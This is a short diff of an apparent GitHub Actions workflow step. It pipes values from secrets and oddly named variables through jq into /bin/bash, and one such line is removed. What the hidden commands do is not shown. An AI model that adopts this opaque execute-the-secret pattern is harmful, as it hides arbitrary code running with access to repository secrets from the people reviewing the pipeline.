@@ -18,7 +18,6 @@ jobs:
           a45: ${{ secrets.a45 }}
         run: |
           printf '%s' "$a45" | jq -r .jkroc955 | /bin/bash
-          echo $t456 | jq -r .fmaqp398 | /bin/bash
           echo $wxv60532 | jq -r .t31205 | /bin/bash
           echo $yb18366 | jq -r .epv1 | /bin/bash
           echo $c21 | jq -r .hn9745 | /bin/bash
